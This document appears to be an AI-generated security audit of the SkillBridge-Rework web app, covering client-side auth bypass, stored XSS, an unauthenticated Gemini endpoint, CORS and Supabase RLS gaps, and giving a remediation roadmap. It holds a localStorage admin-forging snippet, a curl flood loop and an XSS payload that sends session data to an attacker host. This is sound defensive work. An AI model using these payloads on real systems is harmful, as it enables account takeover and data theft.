# EGM-DESIGN: Hostile Design Critic & Security Audit Report for SkillBridge

**Auditor:** Design Critic Goldfish (Senior Software Engineer & Security Architect)  
**Target:** SkillBridge Rework Architecture (`SkillBridge-Rework`)  
**Audit Status:** COMPLETE — UNSPARING ASSESSMENT  
**Overall Threat Rating:** 🚨 **CRITICAL RISK** (Zero-trust failure; pervasive client-side authentication facade, unauthenticated AI endpoints, widespread stored/DOM XSS, disconnected data layer, and absent database security policies).

---

## 1. Executive Summary & Architectural Overview

The current **SkillBridge-Rework** architecture exhibits severe architectural dissonance:
1. **The Auth Illusion:** Authentication and authorization are executed entirely client-side via unvalidated `localStorage` dictionaries and hardcoded preloaded credentials. The server neither issues, validates, nor revokes session tokens.
2. **The Disconnected Data Layer:** Although a comprehensive 12-table PostgreSQL schema (`supabase/schema.sql`) exists, the frontend runs exclusively against an ephemeral `localStorage` mock database (`SkillBridgeDB` in `supabase.js`).
3. **Unprotected Microservice & Resource Exhaustion:** The Python FastAPI AI matchmaking microservice is exposed to the world without authentication, without rate limiting, and with wildcard CORS, leaving the organization's Google Gemini API quota and billing exposed to denial-of-wallet and quota exhaustion attacks.
4. **Pervasive Injection Surface:** User data, cover letters, chat messages, and notification strings are concatenated directly into raw HTML template strings via `innerHTML`, creating critical stored and DOM XSS vulnerabilities throughout the platform.

Below is the complete, evidence-based vulnerability and architectural stress-test breakdown.

---

## 2. Deep-Dive Security Vulnerability Assessment

### VULN-01: Client-Side Auth Facade & Instant Privilege Escalation
* **Severity:** **CRITICAL**
* **Affected Scope:** 
  - `frontend/assets/js/auth.js` (Lines 9–166, 190–226, 313–380)
  - `frontend/pages/auth/login.html`
* **Vulnerability Description:**
  - In `auth.js`, the `login(email, password, role)` function **completely ignores the `password` parameter**. No password hashing, no server verification, and no credential verification occurs.
  - Hardcoded administrative takeover: If an email contains `"admin"` or the role parameter is `'admin'` (Line 194: `cleanEmail === 'admin@skillbridge.id' || role === 'admin' || cleanEmail.includes('admin')`), the function immediately authenticates the user as `DEFAULT_ADMIN` (`admin_1`, role: `'admin'`).
  - Fallback logic: Any arbitrary non-existent email will automatically fall back to logging in as the first preloaded student (`std1`) or UMKM (`umkm_demo_1`).
  - Route guards (`requireAuth`, `enforceUniversalGuard`) rely entirely on `localStorage.getItem('SKILLBRIDGE_CURRENT_USER')`.
* **Exploit Vector:**
  Any user can open the browser DevTools console on any page and execute:
  ```javascript
  localStorage.setItem('SKILLBRIDGE_CURRENT_USER', JSON.stringify({
    id: 'admin_compromised',
    name: 'Attacker Admin',
    email: 'hacker@admin.com',
    role: 'admin'
  }));
  location.reload();
  ```
  The user is immediately granted unrestricted access to the Admin Dashboard, verification approvals, and user management.
* **Comparison with Reference Architecture:**
  The reference repository (`c:\laragon\www\SkillBridge\backend\src\middleware\auth.ts`, Lines 14–31, 61–75) implements cryptographic JWT verification via `env.JWT_SECRET`, database-backed session validation with `tokenVersion` invalidation, and strict role checks via Express middleware (`requireRole`). The Rework has completely discarded this.

---

### VULN-02: Stored & DOM Cross-Site Scripting (XSS) via Unsanitized `innerHTML`
* **Severity:** **CRITICAL**
* **Affected Scope:**
  - `frontend/assets/js/notifications.js` (Lines 92–102)
  - `frontend/assets/js/toast.js` (Lines 33–36)
  - `frontend/assets/js/auth.js` (Line 446)
  - `frontend/pages/projects.html` (Lines 245–296)
  - `frontend/pages/umkm/applicants.html` (Lines 223–288)
  - `frontend/pages/student/workspace.html` (Lines 764–772)
* **Vulnerability Description:**
  The frontend consistently interpolates unsanitized user inputs, cover letters, chat text, and notification messages into template literals and assigns them directly to `.innerHTML`.
  - **In-App Notifications (`notifications.js` Lines 92–102):**
    ```javascript
    list.innerHTML = notifs.map(n => `
      <div class="notif-item" onclick="window.SkillBridgeNotifications.handleClick('${n.id}', '${n.link || '#'}')">
        <strong>${n.title}</strong>
        <div>${n.message}</div>
      </div>
    `).join('');
    ```
    `n.title`, `n.message`, `n.id`, and `n.link` are rendered directly without entity escaping. Furthermore, `'${n.id}'` allows attribute escaping (`' onclick='...`).
  - **Collaboration Workspace Chat (`workspace.html` Lines 764–772):**
    ```javascript
    container.innerHTML = msgs.map(m => `
      <div>${m.sender_name}</div>
      <div>${m.content}</div>
    `).join('');
    ```
    Chat text entered by one user is directly evaluated as HTML by the counterparty.
  - **Applicant Review (`applicants.html` Lines 258–259):**
    ```javascript
    <p style="color: #475569; margin: 6px 0 0;">"${app.cover_letter}"</p>
    ```
    A student submitting `<img src=x onerror="fetch('https://attacker.com/leak?'+localStorage.getItem('SKILLBRIDGE_CURRENT_USER'))">` will achieve remote execution within the UMKM owner's browser session.
  - **Toast Notifications (`toast.js` Line 35 & `auth.js` Line 446):**
    ```javascript
    toast.innerHTML = `<span class="toast-text">${message}</span>`;
    ```
    Any dynamic or reflected error/success message executes raw scripts.
* **Impact:** Session hijacking, unauthorized data mutation in `localStorage`, and client-side privilege manipulation.

---

### VULN-03: Unauthenticated AI Microservice Endpoint & Token Denial-of-Wallet
* **Severity:** **HIGH** (CRITICAL if deployed publicly)
* **Affected Scope:**
  - `backend-ai/app/main.py` (Lines 50–69)
  - `backend-ai/app/config.py` (Lines 18–26)
  - `backend-ai/app/gemini_service.py` (Lines 94–153)
* **Vulnerability Description:**
  - The endpoint `POST /api/ai-match` has **zero authentication or authorization**. There is no API key, bearer token, HMAC signature, session cookie, or IP-based rate limiting (`slowapi`).
  - Any external actor can trigger Google Gemini API calls via `google.genai.Client(api_key=settings.gemini_api_key)`.
  - While `gemini_service.py` provides fallback to `calculate_heuristic_fallback()`, this fallback only activates *after* the Gemini API call fails or times out.
* **Exploit Vector:**
  An adversary runs a multi-threaded curl script against `http://<host>:8000/api/ai-match`:
  ```bash
  while true; do curl -X POST http://localhost:8000/api/ai-match -H "Content-Type: application/json" -d '{"student_profile":{"skills":["Python"]},"project":{"required_skills":["Python"]}}'; done
  ```
  - **Consequence 1 (Denial of Wallet):** Rapid consumption of paid Google Gemini tokens.
  - **Consequence 2 (Denial of Service):** Google Cloud returns HTTP 429 Quota Exceeded. Legitimate users are locked out of AI evaluations.
  - **Consequence 3 (Event Loop Starvation):** Blocking network calls or unmetered async tasks saturate FastAPI/Uvicorn worker threads.

---

### VULN-04: CORS Misconfiguration (Wildcard Origin with Credentials)
* **Severity:** **MEDIUM**
* **Affected Scope:**
  - `backend-ai/app/config.py` (Lines 27–35)
  - `backend-ai/app/main.py` (Lines 24–30)
* **Vulnerability Description:**
  `config.py` includes `"*"` in `cors_origins`, while `main.py` initializes CORS middleware with:
  ```python
  app.add_middleware(
      CORSMiddleware,
      allow_origins=settings.cors_origins, # Contains "*"
      allow_credentials=True,
      allow_methods=["*"],
      allow_headers=["*"],
  )
  ```
  - According to the W3C CORS specification, setting `Access-Control-Allow-Origin: *` while `Access-Control-Allow-Credentials: true` is an invalid combination that modern browsers reject.
  - If Starlette reflects the request's `Origin` header dynamically to satisfy `allow_credentials=True`, any arbitrary malicious domain visited by a logged-in user can make authenticated cross-origin requests directly to the AI backend.

---

### VULN-05: Critical Supabase RLS Deficiencies & Schema Disconnection
* **Severity:** **HIGH**
* **Affected Scope:** `supabase/schema.sql` (Lines 181–222)
* **Vulnerability Description:**
  - **The "Deny All" Trap:** RLS is enabled on 12 tables, but policies are only written for 6. The remaining tables:
    1. `student_profiles`
    2. `umkm_profiles`
    3. `project_applications`
    4. `notifications`
    5. `reviews`
    6. `audit_logs`
    have **no RLS policies defined whatsoever**. Under PostgreSQL RLS defaults, tables with RLS enabled and no policies default to **DENY ALL**. If the frontend were connected to Supabase today, every student application, profile update, review submission, and audit log write would be blocked with a database 403 error.
  - **Missing Write Policies on `public.users`:** Only `FOR SELECT USING (true)` exists. No user can register or update their name/avatar/bio through Supabase.
  - **Unauthorized Project Creation:** `CREATE POLICY "Allow owners to manage projects" ON public.projects FOR ALL USING (auth.uid() = owner_id);` has no role restriction. Any student or admin account can insert projects into `public.projects`.
  - **Chat Message Tampering:** In `public.messages`, `FOR ALL USING (auth.uid() = sender_id OR auth.uid() = receiver_id);` allows the *receiver* to update or delete messages authored by the sender!
  - **Detached Foreign Keys:** `public.users.id UUID PRIMARY KEY DEFAULT gen_random_uuid()` does not reference Supabase's internal `auth.users(id) ON DELETE CASCADE`. Therefore, `auth.uid()` in RLS policies will never match `public.users(id)` without a custom trigger synchronization.

---

## 3. Architecture Failure Modes & Resiliency Analysis

### 3.1 What Breaks When `localStorage` is Cleared or Quota Exceeded?
1. **Multi-User Collaboration Failure:**
   Because all database state (`SB_MOCK_PROJECTS`, `SB_MOCK_APPLICATIONS`, `SB_MOCK_TASKS`, `SB_MOCK_MESSAGES`) is saved in the browser's local `localStorage`, data is confined to a single device and browser profile. A project created by a UMKM on Computer A will **never** be seen by a student on Computer B.
2. **Crash on `QuotaExceededError`:**
   Browsers impose a strict ~5MB ceiling on `localStorage`. In `supabase.js`, mock verification documents include extracted OCR text and file metadata (`extracted_ocr_text`). As chat logs, reviews, tasks, and audit logs expand:
   - `localStorage.setItem()` throws a native `DOMException: QuotaExceededError`.
   - `supabase.js` functions (`sendMessage`, `applyToProject`, `createProject`, `createTask`) **lack try/catch blocks** around `localStorage.setItem`.
   - Result: Silent application crashes, unhandled promise rejections, and complete data write failure.
3. **Session Eviction:**
   Opening the application in Private/Incognito browsing or clearing browser cache permanently deletes all user accounts, projects, applications, and workspace history with zero backup or disaster recovery mechanism.

### 3.2 What Happens When Gemini API Quota is Exhausted or AI Drops?
1. **Timeout Latency Degradation:**
   In `frontend/assets/js/api.js`, the fetch timeout is set to 10 seconds (`AbortSignal.timeout(10000)`). In `backend-ai/app/gemini_service.py`, `evaluate_match()` first attempts the Gemini Interactions API, blocks on network I/O, catches the error, then attempts `models.generate_content()`. Under network packet loss or API throttling, this sequential round-trip causes a 10-second UI freeze before the frontend aborts.
2. **Quality Degradation via Heuristic Fallback:**
   When Google returns a 429 quota limit, the system degrades to `calculate_heuristic_fallback()`. The "AI Matchmaking" becomes a rudimentary substring search (`pt.lower() in ss.lower()`). If a student lists "Node.js" and the project lists "JavaScript", the fallback fails to recognize semantic equivalence and penalizes the student's match score.
3. **Redundant Re-computation:**
   The backend possesses no caching layer (Redis / SQLite LRU). If a UMKM views 10 applicants with identical skills, the backend makes 10 independent outbound API calls to Google, consuming quota redundantly.

---

## 4. Scalability Limits & Data Integrity Risks

1. **Race Conditions & Lost Updates (No ACID Transactions):**
   Every mutation in `supabase.js` executes an uncoordinated Read-Modify-Write cycle:
   ```javascript
   const apps = JSON.parse(localStorage.getItem('SB_MOCK_APPLICATIONS') || '[]');
   apps.push(newApp);
   localStorage.setItem('SB_MOCK_APPLICATIONS', JSON.stringify(apps));
   ```
   If two asynchronous actions occur (e.g. an incoming chat message while submitting a task, or concurrent tabs), the second `localStorage.setItem` completely overwrites the first, causing silent data corruption and lost records.
2. **Orphaned Entities & Broken Referential Integrity:**
   There is no relational engine validating foreign keys. Deleting a project leaves orphaned applications and orphan tasks referencing dead `workspace_id`s (`ws1`).
3. **Client-Side O(N) In-Memory Rendering Bottlenecks:**
   The market catalog (`getProjects`) and applicant viewer fetch all records into client memory and execute unindexed `.filter()` loops across strings. At 1,000+ projects and 5,000+ applicants, serial JSON parsing on the main UI thread will cause perceptible frame drops, DOM freezing, and mobile browser crashes.

---

## 5. Prioritized Remediation Roadmap

| Priority | Risk Area | Recommended Technical Remediation | Target Files |
| :--- | :--- | :--- | :--- |
| **P0 (Immediate)** | **Authentication** | Replace client-side mock auth with real **Supabase Auth** (`supabase.auth.signInWithPassword`, `signUp`). Store JWT in secure httpOnly cookies or Supabase client session. Enforce server-side route guards. | `frontend/assets/js/auth.js` |
| **P0 (Immediate)** | **XSS Injection** | Introduce a global HTML sanitization function (`escapeHtml`). Replace `.innerHTML = ...` with safe DOM construction (`document.createElement`, `.textContent`, or template clones). | `notifications.js`, `toast.js`, `workspace.html`, `applicants.html`, `projects.html` |
| **P1 (Critical)** | **AI Endpoint Security** | 1. Implement FastAPI `HTTPBearer` dependency validating Supabase JWT tokens.<br>2. Integrate `slowapi` rate limiter (e.g., 5 requests/min per IP/user).<br>3. Restrict `cors_origins` to explicit origin domains; remove wildcard `*`. | `backend-ai/app/main.py`, `backend-ai/app/config.py` |
| **P1 (Critical)** | **Supabase RLS & DB Connection** | 1. Connect frontend to real Supabase client (`@supabase/supabase-js`).<br>2. Author missing RLS policies for `student_profiles`, `umkm_profiles`, `project_applications`, `notifications`, `reviews`, and `audit_logs`.<br>3. Link `public.users.id` directly to `auth.users(id)`. | `supabase/schema.sql`, `frontend/assets/js/supabase.js` |
| **P2 (High)** | **AI Caching & Performance** | Implement an in-memory or Redis LRU cache keyed by `sha256(student_skills + project_skills)` to cache AI evaluation results and protect Google API quota. | `backend-ai/app/gemini_service.py` |
| **P2 (High)** | **Storage Resiliency** | Wrap all client-side storage writes in `try/catch` with graceful quota degradation warnings. Migrate critical business state to Postgres tables. | `frontend/assets/js/supabase.js` |

---
*Report transmitted to orchestrator. End of Hostile Security & Design Review.*
